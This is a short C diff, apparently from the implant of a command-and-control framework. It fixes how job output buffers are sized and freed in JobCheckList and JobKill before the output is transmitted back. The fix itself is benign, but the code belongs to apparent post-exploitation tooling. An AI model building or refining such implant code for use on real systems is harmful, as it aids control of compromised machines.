@@ -121,6 +121,7 @@ VOID JobCheckList()
                         // just read what there is available.
                         DWORD Available = 0;
                         PVOID Buffer    = NULL;
+                        DWORD Size      = 0;
 
                         if ( Instance->Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
                         {
@@ -128,7 +129,8 @@ VOID JobCheckList()
 
                             if ( Available > 0 )
                             {
-                                Buffer = Instance->Win32.LocalAlloc( LPTR, Available );
+                                Size   = Available;
+                                Buffer = Instance->Win32.LocalAlloc( LPTR, Size );
 
                                 if ( Instance->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
@@ -137,7 +139,7 @@ VOID JobCheckList()
                                     PackageTransmit( Package, NULL, NULL );
                                 }
 
-                                DATA_FREE( Buffer, Available )
+                                DATA_FREE( Buffer, Size )
                             }
                         }
                     }
@@ -336,7 +338,8 @@ BOOL JobKill( DWORD JobID )
 
                             if ( Available > 0 )
                             {
-                                Buffer = Instance->Win32.LocalAlloc( LPTR, Available );
+                                DWORD Size = Available;
+                                Buffer = Instance->Win32.LocalAlloc( LPTR, Size );
 
                                 if ( Instance->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
@@ -345,7 +348,7 @@ BOOL JobKill( DWORD JobID )
                                     PackageTransmit( Package, NULL, NULL );
                                 }
 
-                                DATA_FREE( Buffer, Available )
+                                DATA_FREE( Buffer, Size )
                             }
                         }
                     }
